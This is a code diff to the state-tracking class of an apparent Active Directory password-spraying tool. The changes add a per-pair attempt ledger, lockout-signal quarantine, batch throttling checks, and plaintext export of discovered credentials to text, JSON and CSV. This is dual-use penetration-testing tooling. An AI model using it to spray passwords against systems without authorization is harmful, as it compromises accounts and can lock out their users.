+            "total_dispatches": self.total_dispatches,
             "attempts_by_password": self.attempts_by_password,
             # Feature D: Throttling
             "conn_fail_history": self.conn_fail_history,
@@ -596,19 +1823,18 @@ class State:
             "engine_health": self.engine_health,
             "known_bad_realms": self.known_bad_realms,
             "working_realm": self.working_realm,
+            "identity_filter_complete": self.identity_filter_complete,
         }
-        self.state_file.write_text(json.dumps(data, indent=2))
+        self._atomic_write_text(self.state_file, json.dumps(data, indent=2) + "\n")
 
         # Also write human-readable files
-        if self.found_creds:
-            creds_lines = [f"{user}:{secret}" for user, secret in self.found_creds.items()]
-            self.creds_file.write_text("\n".join(creds_lines) + "\n")
+        creds_lines = [f"{item['user']}:{item['secret']}" for item in self.credentials]
+        self._atomic_write_text(self.creds_file, "\n".join(creds_lines) + ("\n" if creds_lines else ""))
 
-        if self.locked_users:
-            self.lockouts_file.write_text("\n".join(sorted(self.locked_users)) + "\n")
+        locked_lines = sorted(self.locked_users)
+        self._atomic_write_text(self.lockouts_file, "\n".join(locked_lines) + ("\n" if locked_lines else ""))
 
-        if self.used_passwords:
-            self.used_file.write_text("\n".join(self.used_passwords) + "\n")
+        self._atomic_write_text(self.used_file, "\n".join(self.used_passwords) + ("\n" if self.used_passwords else ""))
 
         # Export results if requested
         if self.cfg.export in ("json", "all"):
@@ -616,11 +1842,51 @@ class State:
         if self.cfg.export in ("csv", "all"):
             self.export_results("csv")
 
+    def _target_identity(self) -> Dict[str, Any]:
+        """Stable fields that must match before a saved run can be resumed."""
+        return {
+            "domain": self.cfg.domain.casefold(),
+            "dc_ip": self.cfg.dc_ip,
+            "pth_mode": self.cfg.pth_mode,
+        }
+
+    def _input_identity(self) -> Dict[str, Any]:
+        """Fingerprints and safety settings that must match on resume."""
+        canonical_users = [canonical_identity(user, self.cfg.domain) for user in self.cfg.users]
+        canonical_source_users = [
+            canonical_identity(user, self.cfg.domain)
+            for user in (self.cfg.source_users or self.cfg.users)
+        ]
+        safety = {
+            "tool": self.cfg.tool,
+            "protocol": self.cfg.protocol,
+            "pth_mode": self.cfg.pth_mode,
+            "minutes_between_batches": self.cfg.time_between_rounds,
+            "passes_per_batch": self.cfg.passwords_per_round,
+            "lockout_threshold": self.cfg.lockout_threshold,
+            "lockout_burst": self.cfg.lockout_burst,
+            "schedule": self.cfg.schedule,
+            "filter_disabled": self.cfg.filter_disabled,
+            "dry_run": self.cfg.dry_run,
+            "engine_cooldown_rounds": self.cfg.engine_cooldown_rounds,
+            "engine_transient_threshold": self.cfg.engine_transient_threshold,
+            "engine_timeout_seconds": self.cfg.engine_timeout_seconds,
+            "engine_idle_timeout_seconds": self.cfg.engine_idle_timeout_seconds,
+            "realm_retry": self.cfg.realm_retry,
+        }
+        return {
+            "source_users_sha256": _sha256_json(canonical_source_users),
+            "users_sha256": _sha256_json(canonical_users),
+            "secrets_sha256": _sha256_json(self.cfg.passwords),
+            "safety_sha256": _sha256_json(safety),
+        }
+
     def record_spray_start(self, engine: Engine, secret: str, round_idx: int):
         """Log spray start header."""
+        self.current_round = round_idx
         ts = datetime.datetime.now().isoformat()
         masked = "***"
-        self._log_line(f"=== {ts} SPRAY engine={engine} secret={masked} round={round_idx} ===")
+        self._log_line(f"=== {ts} SPRAY engine={engine} secret={masked} batch={round_idx} ===")
         # Feature E: Record timeline event
         self.record_timeline_event("spray", f"{engine} with masked secret", round_idx=round_idx)
 
@@ -630,11 +1896,159 @@ class State:
         self._log_line(f"=== {ts} END successes={successes} lockouts={lockouts} conn_fails={conn_fails} errors={errors} aborted={aborted} reason={abort_reason} ===")
         self._log_line("")
 
-    def add_cred(self, user: str, secret: str, is_admin: bool = False):
-        """Record a found credential."""
+    @property
+    def credential_count(self) -> int:
+        """Number of unique working user/secret pairs."""
+        return len(self.credentials)
+
+    @property
+    def lockout_count(self) -> int:
+        """Safety-signal events retained for cumulative stop decisions."""
+        if self.lockout_signals:
+            return len(self.lockout_signals)
+        return len(self.locked_users) + self.unknown_lockout_events
+
+    def signal_identity_count(self, certainty: Optional[str] = None) -> int:
+        """Count distinct known identities affected by retained safety signals."""
+        return len({
+            canonical_identity(str(event["user"]), self.cfg.domain)
+            for event in self.lockout_signals
+            if event.get("user")
+            and (certainty is None or event.get("certainty") == certainty)
+        })
+
+    def credential_pairs(self) -> List[Tuple[str, str]]:
+        return [(item["user"], item["secret"]) for item in self.credentials]
+
+    def admin_credential_pairs(self) -> Set[Tuple[str, str]]:
+        return {
+            (item["user"], item["secret"])
+            for item in self.credentials
+            if item.get("is_admin")
+        }
+
+    def known_signal_users(self) -> Set[str]:
+        users = {
+            str(event["user"])
+            for event in self.lockout_signals
+            if event.get("user")
+        }
+        return users or set(self.locked_users)
+
+    def signal_count_for_secret(self, secret: str) -> int:
+        return sum(1 for event in self.lockout_signals if event.get("secret") == secret)
+
+    def _display_user(self, user: str) -> str:
+        key = canonical_identity(user, self.cfg.domain)
+        configured = self._configured_by_key.get(key)
+        if configured is not None:
+            return configured
+        configured = self._configured_by_alias.get(str(user).strip().casefold())
+        return configured if configured is not None else str(user).strip()
+
+    def _quarantine(self, user: str, reason: str) -> None:
+        display = self._display_user(user)
+        key = canonical_identity(display, self.cfg.domain)
+        existing = self.quarantined_users.get(key)
+        reasons = set(existing.get("reasons", [])) if existing else set()
+        if existing and existing.get("reason"):
+            reasons.add(str(existing["reason"]))
+        reasons.add(reason)
+        primary = min(
+            reasons,
+            key=lambda item: QUARANTINE_PRIORITY.get(item, 50),
+        )
+        self.quarantined_users[key] = {
+            "user": str(existing.get("user", display)) if existing else display,
+            "reason": primary,
+            "reasons": sorted(reasons),
+        }
+
+    def quarantine_reason(self, user: str) -> Optional[str]:
+        record = self.quarantined_users.get(canonical_identity(user, self.cfg.domain))
+        return str(record.get("reason")) if record else None
+
+    def quarantine_reasons(self, user: str) -> Set[str]:
+        record = self.quarantined_users.get(canonical_identity(user, self.cfg.domain))
+        if not record:
+            return set()
+        reasons = {
+            str(reason)
+            for reason in record.get("reasons", [])
+            if isinstance(reason, str)
+        }
+        if record.get("reason"):
+            reasons.add(str(record["reason"]))
+        return reasons
+
+    def _remove_quarantine_reason(self, user: str, reason: str) -> None:
+        key = canonical_identity(user, self.cfg.domain)
+        record = self.quarantined_users.get(key)
+        if not record:
+            return
+        reasons = self.quarantine_reasons(user)
+        reasons.discard(reason)
+        if not reasons:
+            del self.quarantined_users[key]
+            return
+        primary = min(
+            reasons,
+            key=lambda item: QUARANTINE_PRIORITY.get(item, 50),
+        )
+        record["reason"] = primary
+        record["reasons"] = sorted(reasons)
+
+    def add_cred(
+        self,
+        user: str,
+        secret: str,
+        is_admin: bool = False,
+        source_round: Optional[int] = None,
+        engine: str = "",
+        persist: bool = True,
+    ) -> bool:
+        """Record a unique working credential pair. Return True when newly added."""
+        if secret not in self.cfg.passwords:
+            raise ValueError("credential finding references an unconfigured secret")
+        configured_keys = {
+            canonical_identity(configured, self.cfg.domain)
+            for configured in self.cfg.users
+        }
+        if canonical_identity(user, self.cfg.domain) not in configured_keys:
+            raise ValueError("credential finding references an unconfigured identity")
+        user = self._display_user(user)
         self.found_creds[user] = secret
         if is_admin:
             self.admin_users[user] = secret
+
+        pair = (canonical_identity(user, self.cfg.domain), secret)
+        existing = self._credential_index.get(pair)
+        if existing:
+            if is_admin and not existing.get("is_admin"):
+                existing["is_admin"] = True
+                if persist:
+                    self.save()
+            return False
+
+        captured_at = datetime.datetime.now().isoformat()
+        record = {
+            "user": user,
+            "secret": secret,
+            "is_admin": is_admin,
+            "captured_at": captured_at,
+            "source_round": source_round if source_round is not None else self.current_round,
+            "source_pass": (
+                self.current_pass
+                or source_round
+                or self.current_round
+                or None
+            ),
+            "source_batch": self.current_round or source_round or None,
+            "engine": engine,
+        }
+        self.credentials.append(record)
+        self._credential_index[pair] = record
+        self._quarantine(user, "credential_found")
 
         # Track pattern learning
         pattern = classify_password_pattern(secret)
@@ -643,73 +2057,429 @@ class State:
         # Feature E: Record timeline event before save
         self.record_timeline_event("credential", f"{user} (pattern: {pattern})")
 
-        ts = datetime.datetime.now().isoformat()
-        self._log_line(f"{ts} CREDENTIAL {user}:{secret} admin={is_admin} pattern={pattern}")
-        self.save()
+        self._log_line(f"{captured_at} CREDENTIAL {user}:{secret} admin={is_admin} pattern={pattern}")
+        if persist:
+            self.save()
+        return True
 
-    def add_lockout(self, user: str):
-        """Record a lockout."""
-        self.locked_users.add(user)
+    def add_lockout(
+        self,
+        user: Optional[str],
+        *,
+        certainty: str = "definitive",
+        engine: str = "",
+        protocol: str = "",
+        secret: Optional[str] = None,
+        raw_line: str = "",
+        stage: str = "spray",
+        source_pass: Optional[int] = None,
+        source_batch: Optional[int] = None,
+        persist: bool = True,
+    ) -> bool:
+        """Record one definitive or ambiguous safety signal."""
+        if certainty not in {"definitive", "ambiguous"}:
+            raise ValueError(f"invalid safety-signal certainty: {certainty}")
+        if stage not in {"spray", "identity_enumeration"}:
+            raise ValueError(f"invalid safety-signal stage: {stage}")
+        if stage == "spray" and secret not in self.cfg.passwords:
+            raise ValueError("a spray safety signal must reference a configured secret")
+        if stage == "identity_enumeration" and secret is not None:
+            raise ValueError("an identity-enumeration signal cannot reference a secret")
+        if user and user != "(unknown)" and (
+            canonical_identity(user, self.cfg.domain) not in self._configured_by_key
+        ):
+            raise ValueError("safety signal references an unconfigured identity")
+        ts = datetime.datetime.now().isoformat()
+        definitive = certainty == "definitive"
+        if not user or user == "(unknown)":
+            self.unknown_lockout_events += 1
+            self.lockout_signals.append({
+                "ts": ts,
+                "user": None,
+                "certainty": certainty,
+                "engine": engine,
+                "protocol": protocol,
+                "stage": stage,
+                "secret": secret,
+                "raw": raw_line,
+                "source_pass": source_pass or self.current_pass or None,
+                "source_batch": source_batch or self.current_round or None,
+            })
+            self.record_timeline_event("lockout", f"unknown user ({certainty})")
+            self._log_line(
+                f"{ts} LOCKOUT-SIGNAL unknown-user certainty={certainty} stage={stage}"
+            )
+            if persist:
+                self.save()
+            return True
+
+        user = self._display_user(user)
+        key = canonical_identity(user, self.cfg.domain)
+        if any(
+            canonical_identity(str(event.get("user", "")), self.cfg.domain) == key
+            and event.get("certainty") == certainty
+            for event in self.lockout_signals
+            if event.get("user")
+        ):
+            if definitive:
+                self.locked_users.add(user)
+                self._quarantine(user, "confirmed_lockout")
+            else:
+                self._quarantine(user, "ambiguous_lockout_signal")
+            return False
+
+        if definitive:
+            self.locked_users.add(user)
+            self._quarantine(user, "confirmed_lockout")
+        else:
+            self._quarantine(user, "ambiguous_lockout_signal")
+
+        self.lockout_signals.append({
+            "ts": ts,
+            "user": user,
+            "certainty": certainty,
+            "engine": engine,
+            "protocol": protocol,
+            "stage": stage,
+            "secret": secret,
+            "raw": raw_line,
+            "source_pass": source_pass or self.current_pass or None,
+            "source_batch": source_batch or self.current_round or None,
+        })
 
         # Feature E: Record timeline event before save
-        self.record_timeline_event("lockout", user)
+        self.record_timeline_event("lockout", f"{user} ({certainty})")
 
-        ts = datetime.datetime.now().isoformat()
-        self._log_line(f"{ts} LOCKOUT {user}")
-        self.save()
+        self._log_line(
+            f"{ts} LOCKOUT-SIGNAL {user} certainty={certainty} stage={stage}"
+        )
+        if persist:
+            self.save()
+        return True
 
     def mark_used(self, secret: str):
         """Mark a password/hash as used."""
-        self.used_passwords.append(secret)
-        self.completed_rounds += 1
+        if secret not in self.cfg.passwords:
+            raise ValueError("cannot complete an unconfigured secret")
+        ledger = self.pair_ledger.get(secret, {})
+        for user in self.cfg.users:
+            key = canonical_identity(user, self.cfg.domain)
+            record = ledger.get(key)
+            if record is not None and record.get("status") not in TERMINAL_PAIR_STATUSES:
+                raise RuntimeError(
+                    f"cannot complete a pass while {user} is still in flight"
+                )
+            if record is None and key not in self.quarantined_users:
+                raise RuntimeError(
+                    "cannot complete a pass without an outcome or quarantine "
+                    f"decision for {user}"
+                )
+        if secret not in self.used_passwords:
+            self.used_passwords.append(secret)
+        try:
+            self.remaining_queue.remove(secret)
+        except ValueError:
+            pass
         self.save()
+
+    def mark_round_complete(self):
+        """Record one completed batch and its delay anchor."""
+        if self.remaining_queue:
+            progress = self.current_batch_progress()
+            if progress != self.cfg.passwords_per_round:
+                raise RuntimeError(
+                    "cannot complete a batch before all of its pass slots are used"
+                )
+        self.completed_rounds += 1
+        self.last_batch_completed_at = datetime.datetime.now().isoformat()
+        self.save()
+
+    def current_batch_progress(self) -> int:
+        """Return completed passes in the active, not-yet-completed batch."""
+        if not self.remaining_queue:
+            return 0
+        progress = (
+            len(self.used_passwords)
+            - (self.completed_rounds * self.cfg.passwords_per_round)
+        )
+        if not 0 <= progress <= self.cfg.passwords_per_round:
+            raise RuntimeError(
+                "saved batch progress is inconsistent with used secrets; refusing to spray"
+            )
+        return progress
+
+    @staticmethod
+    def _atomic_write_text(path: Path, content: str):
+        """Atomically replace a UTF-8 text file, retaining the old file on a crash."""
+        fd, tmp_name = tempfile.mkstemp(prefix=f".{path.name}.", suffix=".tmp", dir=path.parent)
+        tmp_path = Path(tmp_name)
+        try:
+            os.fchmod(fd, 0o600)
+            with os.fdopen(fd, "w", encoding="utf-8") as handle:
+                fd = -1
+                handle.write(content)
+                handle.flush()
+                os.fsync(handle.fileno())
+            os.replace(tmp_path, path)
+            os.chmod(path, 0o600)
+        finally:
+            if fd >= 0:
+                os.close(fd)
+            try:
+                tmp_path.unlink()
+            except FileNotFoundError:
+                pass
 
     def _log_line(self, line: str):
         """Append a line to the overall log."""
-        with open(self.overall_log, "a") as f:
+        fd = os.open(self.overall_log, os.O_WRONLY | os.O_APPEND | os.O_CREAT, 0o600)
+        os.fchmod(fd, 0o600)
+        with os.fdopen(fd, "a", encoding="utf-8") as f:
             f.write(line + "\n")
 
     # =============================================================================
     # Feature 1: Credential-reuse matrix methods
     # =============================================================================
 
-    def mark_attempted(self, secret: str, user: str):
-        """Record that a (user, password) pair was attempted."""
-        if secret not in self.attempted_matrix:
-            self.attempted_matrix[secret] = set()
-        self.attempted_matrix[secret].add(user)
+    def pair_status(self, secret: str, user: str) -> Optional[str]:
+        key = canonical_identity(user, self.cfg.domain)
+        record = self.pair_ledger.get(secret, {}).get(key)
+        return str(record.get("status")) if record else None
 
-        # Update stats
+    def begin_attempt(self, secret: str, user: str, engine: Engine) -> bool:
+        """Persist an in-flight pair before launching its engine process."""
+        if secret not in self.cfg.passwords:
+            raise ValueError("attempt references an unconfigured secret")
+        if canonical_identity(user, self.cfg.domain) not in self._configured_by_key:
+            raise ValueError("attempt references an unconfigured identity")
+        user = self._display_user(user)
+        key = canonical_identity(user, self.cfg.domain)
+        ledger = self.pair_ledger.setdefault(secret, {})
+        existing = ledger.get(key)
+        if existing:
+            status = str(existing.get("status", "indeterminate"))
+            retryable = status == "indeterminate" and self.cfg.retry_indeterminate
+            if not retryable:
+                return False
+            dispatch_count = int(existing.get("dispatch_count", 1)) + 1
+            previous_status = status
+        else:
+            dispatch_count = 1
+            previous_status = ""
+
+        now = datetime.datetime.now().isoformat()
+        ledger[key] = {
+            "user": user,
+            "status": "in_flight",
+            "engine": str(engine),
+            "protocol": engine.protocol or "",
+            "started_at": now,
+            "updated_at": now,
+            "dispatch_count": dispatch_count,
+            "source_pass": self.current_pass or None,
+            "source_batch": self.current_round or None,
+            "previous_status": previous_status,
+            "detail": "",
+        }
         self.total_attempts += 1
+        self.total_dispatches += 1
         self.attempts_by_password[secret] = self.attempts_by_password.get(secret, 0) + 1
+        self.save()
+        return True
 
-    def mark_attempted_batch(self, secret: str, users: List[str]):
-        """Mark all users in a list as attempted for this secret (for kerbrute)."""
-        if secret not in self.attempted_matrix:
-            self.attempted_matrix[secret] = set()
-        self.attempted_matrix[secret].update(users)
+    def finish_attempt(
+        self,
+        secret: str,
+        user: str,
+        status: str,
+        detail: str = "",
+        *,
+        persist: bool = True,
+    ) -> None:
+        """Persist a terminal outcome for the currently in-flight pair."""
+        if status not in TERMINAL_PAIR_STATUSES:
+            raise ValueError(f"invalid terminal pair status: {status}")
+        if secret not in self.cfg.passwords:
+            raise ValueError("terminal outcome references an unconfigured secret")
+        if canonical_identity(user, self.cfg.domain) not in self._configured_by_key:
+            raise ValueError("terminal outcome references an unconfigured identity")
+        user = self._display_user(user)
+        key = canonical_identity(user, self.cfg.domain)
+        ledger = self.pair_ledger.setdefault(secret, {})
+        record = ledger.get(key)
+        if record is None:
+            # Compatibility for direct parser/state use outside the strict runner.
+            now = datetime.datetime.now().isoformat()
+            record = {
+                "user": user,
+                "status": "in_flight",
+                "engine": "",
+                "protocol": "",
+                "started_at": now,
+                "updated_at": now,
+                "dispatch_count": 1,
+                "previous_status": "",
+                "detail": "",
+            }
+            ledger[key] = record
+            self.total_attempts += 1
+            self.total_dispatches += 1
+            self.attempts_by_password[secret] = self.attempts_by_password.get(secret, 0) + 1
+        elif record.get("status") != "in_flight":
+            return
 
-        # Update stats
-        self.total_attempts += len(users)
-        self.attempts_by_password[secret] = self.attempts_by_password.get(secret, 0) + len(users)
+        record["status"] = status
+        record["updated_at"] = datetime.datetime.now().isoformat()
+        record["detail"] = detail
+        record.pop("previous_status", None)
+        self.attempted_matrix.setdefault(secret, set()).add(user)
+        if status == "indeterminate":
+            self._quarantine(user, "indeterminate")
+        else:
+            has_other_indeterminate = any(
+                other.get(key, {}).get("status") in {"in_flight", "indeterminate"}
+                for other_secret, other in self.pair_ledger.items()
+                if other_secret != secret
+            )
+            if not has_other_indeterminate:
+                self._remove_quarantine_reason(user, "indeterminate")
+        if persist:
+            self.save()
+
+    def cancel_attempt(self, secret: str, user: str) -> None:
+        """Undo an in-flight dispatch proven not to have reached authentication."""
+        key = canonical_identity(user, self.cfg.domain)
+        ledger = self.pair_ledger.get(secret, {})
+        record = ledger.get(key)
+        if not record or record.get("status") != "in_flight":
+            return
+        previous_status = str(record.get("previous_status", ""))
+        self.total_attempts = max(0, self.total_attempts - 1)
+        self.total_dispatches = max(0, self.total_dispatches - 1)
+        current = self.attempts_by_password.get(secret, 0)
+        if current <= 1:
+            self.attempts_by_password.pop(secret, None)
+        else:
+            self.attempts_by_password[secret] = current - 1
+        if previous_status:
+            record["status"] = previous_status
+            record["updated_at"] = datetime.datetime.now().isoformat()
+            record["dispatch_count"] = max(
+                1,
+                int(record.get("dispatch_count", 1)) - 1,
+            )
+            record.pop("previous_status", None)
+        else:
+            del ledger[key]
+            if not ledger:
+                self.pair_ledger.pop(secret, None)
+        self.save()
+
+    def reconcile_ledger_metrics(self) -> None:
+        """Rebuild attempt counters from the authoritative pair ledger."""
+        attempts_by_secret: Dict[str, int] = {}
+        for secret, records in self.pair_ledger.items():
+            dispatches = sum(
+                max(0, int(record.get("dispatch_count", 0)))
+                for record in records.values()
+                if isinstance(record, dict)
+            )
+            if dispatches:
+                attempts_by_secret[secret] = dispatches
+        self.attempts_by_password = attempts_by_secret
+        self.total_attempts = sum(attempts_by_secret.values())
+        self.total_dispatches = self.total_attempts
+
+    def pair_status_counts(self) -> Dict[str, int]:
+        """Return current pair outcomes derived from the ledger."""
+        counts: Dict[str, int] = {}
+        for records in self.pair_ledger.values():
+            for record in records.values():
+                status = str(record.get("status", "indeterminate"))
+                counts[status] = counts.get(status, 0) + 1
+        return counts
+
+    def skipped_pair_count(self) -> int:
+        """Count undispatched pairs omitted from passes already completed."""
+        skipped = 0
+        for secret in self.used_passwords:
+            ledger = self.pair_ledger.get(secret, {})
+            for user in self.cfg.users:
+                if canonical_identity(user, self.cfg.domain) not in ledger:
+                    skipped += 1
+        return skipped
+
+    def mark_attempted(self, secret: str, user: str, status: str = "auth_failure"):
+        """Compatibility helper for recording a terminal pair exactly once."""
+        existing = self.pair_status(secret, user)
+        if existing in TERMINAL_PAIR_STATUSES:
+            return
+        if existing != "in_flight":
+            self.begin_attempt(secret, user, Engine("internal"))
+        self.finish_attempt(secret, user, status)
+
+    def mark_attempted_batch(self, secret: str, users: List[str], status: str = "dry_run"):
+        """Record a deterministic batch, primarily for dry-run compatibility."""
+        for user in users:
+            self.mark_attempted(secret, user, status=status)
+
+    def eligible_users_for(self, secret: str) -> List[str]:
+        """Return identities safe to dispatch for this secret."""
+        legacy_attempted = {
+            canonical_identity(user, self.cfg.domain)
+            for user in self.attempted_matrix.get(secret, set())
+        }
+        ledger = self.pair_ledger.get(secret, {})
+        eligible: List[str] = []
+        for user in self.cfg.users:
+            key = canonical_identity(user, self.cfg.domain)
+            reasons = self.quarantine_reasons(user)
+            if "confirmed_lockout" in reasons:
+                continue
+            if "ambiguous_lockout_signal" in reasons:
+                continue
+            if "credential_found" in reasons and not self.cfg.retry_compromised:
+                continue
+            if "indeterminate" in reasons and not self.cfg.retry_indeterminate:
+                continue
+
+            record = ledger.get(key)
+            if record:
+                status = str(record.get("status", "indeterminate"))
+                if status == "indeterminate" and self.cfg.retry_indeterminate:
+                    eligible.append(user)
+                continue
+            if key in legacy_attempted:
+                continue
+            eligible.append(user)
+        return eligible
+
+    def write_userlist(self, users: List[str]) -> str:
+        """Create a private unpredictable engine input file."""
+        fd, name = tempfile.mkstemp(prefix=".users-", suffix=".txt", dir=self.log_dir)
+        try:
+            os.fchmod(fd, 0o600)
+            with os.fdopen(fd, "w", encoding="utf-8") as handle:
+                fd = -1
+                handle.write("\n".join(users) + "\n")
+                handle.flush()
+                os.fsync(handle.fileno())
+        finally:
+            if fd >= 0:
+                os.close(fd)
+        return name
 
     def build_userlist_for(self, secret: str) -> Tuple[str, int]:
         """
         Build a filtered userlist for a specific password.
         Returns (temp_file_path, count_of_users_not_yet_attempted).
         """
-        attempted = self.attempted_matrix.get(secret, set())
-        remaining_users = [u for u in self.cfg.users if u not in attempted]
+        remaining_users = self.eligible_users_for(secret)
 
         if not remaining_users:
             return ("", 0)
 
-        # Write temp file
-        self._tmp_userlist_idx += 1
-        tmp_path = self.log_dir / f".tmp-users-{self._tmp_userlist_idx}.txt"
-        tmp_path.write_text("\n".join(remaining_users) + "\n")
-
-        return (str(tmp_path), len(remaining_users))
+        return (self.write_userlist(remaining_users), len(remaining_users))
 
     # =============================================================================
     # Feature 3: Pattern learning methods
@@ -740,7 +2510,9 @@ class State:
 
     def render_stats(self, console: Console) -> Table:
         """Render spray statistics as a rich Table."""
-        table = Table(title="Spray Statistics", box=box.SQUARE)
+        self.reconcile_ledger_metrics()
+        status_counts = self.pair_status_counts()
+        table = Table(title=f"{PRODUCT_NAME} Run Statistics", box=box.SQUARE)
         table.add_column("Metric", style="cyan")
         table.add_column("Value", style="white")
 
@@ -752,15 +2524,27 @@ class State:
         # Success rate
         success_rate = 0.0
         if self.total_attempts > 0:
-            success_rate = (len(self.found_creds) / self.total_attempts) * 100
+            success_rate = (self.credential_count / self.total_attempts) * 100
 
         table.add_row("Started", self.start_time)
         table.add_row("Elapsed time", elapsed_str)
         table.add_row("Total attempts", str(self.total_attempts))
-        table.add_row("Credentials found", str(len(self.found_creds)))
+        table.add_row("Credentials found", str(self.credential_count))
+        table.add_row("Authentication failures", str(status_counts.get("auth_failure", 0)))
+        table.add_row("Indeterminate pairs", str(status_counts.get("indeterminate", 0)))
+        table.add_row("Skipped pairs", str(self.skipped_pair_count()))
         table.add_row("Success rate", f"{success_rate:.2f}%")
-        table.add_row("Lockouts", str(len(self.locked_users)))
-        table.add_row("Rounds completed", str(self.completed_rounds))
+        lockout_value = str(self.lockout_count)
+        if self.unknown_lockout_events:
+            lockout_value += f" ({self.unknown_lockout_events} unknown-user signal(s))"
+        table.add_row("Safety-signal events", lockout_value)
+        table.add_row("Affected identities", str(self.signal_identity_count()))
+        table.add_row("Confirmed locked identities", str(len(self.locked_users)))
+        table.add_row(
+            "Ambiguous-signal identities",
+            str(self.signal_identity_count("ambiguous")),
+        )
+        table.add_row("Batches completed", str(self.completed_rounds))
 
         # Top 5 attempts by password
         if self.attempts_by_password:
@@ -794,10 +2578,12 @@ class State:
         return table
 
     def get_compact_stats(self) -> str:
-        """Return compact one-line stats string for round summary."""
+        """Return compact one-line stats string for a batch summary."""
+        self.reconcile_ledger_metrics()
+        status_counts = self.pair_status_counts()
         success_rate = 0.0
         if self.total_attempts > 0:
-            success_rate = (len(self.found_creds) / self.total_attempts) * 100
+            success_rate = (self.credential_count / self.total_attempts) * 100
 
         top_pattern = "N/A"
         if self.success_by_pattern:
@@ -807,7 +2593,12 @@ class State:
         reused_count = len(self.detect_cred_reuse())
         reuse_str = f" | Reuse: {reused_count}" if reused_count > 0 else ""
 
-        return f"Attempts: {self.total_attempts} | Success: {len(self.found_creds)} ({success_rate:.1f}%) | Top pattern: {top_pattern}{reuse_str}"
+        return (
+            f"Attempts: {self.total_attempts} | Success: {self.credential_count} "
+            f"({success_rate:.1f}%) | Failures: {status_counts.get('auth_failure', 0)} | "
+            f"Indeterminate: {status_counts.get('indeterminate', 0)} | "
+            f"Skipped: {self.skipped_pair_count()} | Top pattern: {top_pattern}{reuse_str}"
+        )
 
     # =============================================================================
     # Feature 5: JSON/CSV export
@@ -822,6 +2613,8 @@ class State:
 
     def _export_json(self):
         """Export results to results.json."""
+        self.reconcile_ledger_metrics()
+        status_counts = self.pair_status_counts()
         results = {
             "started": self.start_time,
             "config": {
@@ -833,36 +2626,69 @@ class State:
             },
             "stats": {
                 "total_attempts": self.total_attempts,
-                "credentials_found": len(self.found_creds),
-                "lockouts": len(self.locked_users),
-                "rounds_completed": self.completed_rounds,
+                "credentials_found": self.credential_count,
+                "authentication_failures": status_counts.get("auth_failure", 0),
+                "indeterminate_pairs": status_counts.get("indeterminate", 0),
+                "skipped_pairs": self.skipped_pair_count(),
+                "pair_statuses": status_counts,
+                "lockout_signals": self.lockout_count,
+                "affected_signal_identities": self.signal_identity_count(),
+                "confirmed_locked_identities": len(self.locked_users),
+                "ambiguous_signal_identities": self.signal_identity_count("ambiguous"),
+                "unknown_lockout_signals": self.unknown_lockout_events,
+                "batches_completed": self.completed_rounds,
                 "success_by_pattern": self.success_by_pattern,
             },
             "found_creds": self.found_creds,
+            "credentials": self.credentials,
             "cred_reuse": [{"password": pw, "users": users} for pw, users in self.detect_cred_reuse()],
             "admin_users": self.admin_users,
             "locked_users": list(self.locked_users),
-            "attempted_pairs": sum(len(v) for v in self.attempted_matrix.values()),
+            "attempted_pairs": sum(len(records) for records in self.pair_ledger.values()),
         }
 
         json_path = self.log_dir / "results.json"
-        json_path.write_text(json.dumps(results, indent=2))
+        self._atomic_write_text(json_path, json.dumps(results, indent=2) + "\n")
 
     def _export_csv(self):
         """Export credentials to results.csv."""
-        lines = ["user,password,is_admin,source_round,captured_at"]
+        def safe_cell(value: Any) -> Any:
+            if not isinstance(value, str):
+                return value
+            formula_candidate = value.lstrip(" \t\r\n")
+            if (
+                value.startswith(("\t", "\r"))
+                or formula_candidate.startswith(("=", "+", "-", "@"))
+            ):
+                return "'" + value
+            return value
 
-        # We'll capture the round number when each credential was found
-        # For now, export all found credentials
-        for user, secret in self.found_creds.items():
-            is_admin = "Y" if user in self.admin_users else "N"
-            # We don't track the exact round for each cred in the current implementation
-            # This would require extending the state further
-            captured_at = datetime.datetime.now().isoformat()
-            lines.append(f"{user},{secret},{is_admin},,{captured_at}")
+        output = io.StringIO(newline="")
+        writer = csv.writer(output)
+        writer.writerow([
+            "user",
+            "password",
+            "is_admin",
+            "source_pass",
+            "source_batch",
+            "engine",
+            "captured_at",
+        ])
+
+        for item in self.credentials:
+            is_admin = "Y" if item.get("is_admin") else "N"
+            writer.writerow([
+                safe_cell(item["user"]),
+                safe_cell(item["secret"]),
+                is_admin,
+                item.get("source_pass") or item.get("source_round") or "",
+                item.get("source_batch") or item.get("source_round") or "",
+                safe_cell(item.get("engine", "")),
+                item.get("captured_at", ""),
+            ])
 
         csv_path = self.log_dir / "results.csv"
-        csv_path.write_text("\n".join(lines) + "\n")
+        self._atomic_write_text(csv_path, output.getvalue())
 
     # =============================================================================
     # Feature C: Credential-reuse detection across users
@@ -873,9 +2699,9 @@ class State:
         Detect passwords used by multiple users (credential sharing).
         Returns list of (password, [users]) sorted by user count descending.
         """
-        by_pw: Dict[str, List[str]] = {}
-        for user, secret in self.found_creds.items():
-            by_pw.setdefault(secret, []).append(user)
+        by_pw: Dict[str, Set[str]] = {}
+        for item in self.credentials:
+            by_pw.setdefault(item["secret"], set()).add(item["user"])
 
         # Filter to passwords used by >1 user, sort by user count desc
         reused = sorted(
@@ -917,7 +2743,7 @@ class State:
             "ts": datetime.datetime.now().isoformat(),
             "type": event_type,
             "detail": detail,
-            "round": round_idx,
+            "batch": round_idx,
         })
 
     # =============================================================================
@@ -956,10 +2782,11 @@ class State:
         if not h["demoted"]:
             h["demote_count"] = 0
         h["demoted"] = True
-        h["demote_count"] += 1
+        h["demote_count"] = min(h["demote_count"] + 1, MAX_DEMOTE_COUNT)
+        cooldown_ceiling = max(MAX_COOLDOWN, self.cooldown_rounds)
         h["cooldown_remaining"] = min(
-            self.cooldown_rounds * (2 ** (h["demote_count"] - 1)),
-            MAX_COOLDOWN
+            self.cooldown_rounds * (2 ** min(h["demote_count"] - 1, 16)),
+            cooldown_ceiling,
         )
         # Record demotion event (will flush on next save)
         # Note: we don't have round_idx here; callers should record timeline if needed
@@ -981,26 +2808,40 @@ class State:
             detail = f"{engine_key}: back online after {demote_count} demotion(s)"
             self.record_timeline_event("engine_restore", detail)
 
-    def tick_cooldowns(self) -> None:
-        """Decrement cooldown for all demoted engines (call once at round end)."""
-        for h in self.engine_health.values():
+    def tick_cooldowns(self, engine_keys: Optional[Set[str]] = None) -> None:
+        """Decrement cooldowns that were already active when the round began."""
+        records = self.engine_health.items()
+        for engine_key, h in records:
+            if engine_keys is not None and engine_key not in engine_keys:
+                continue
             if h["demoted"] and h["cooldown_remaining"] > 0:
                 h["cooldown_remaining"] -= 1
 
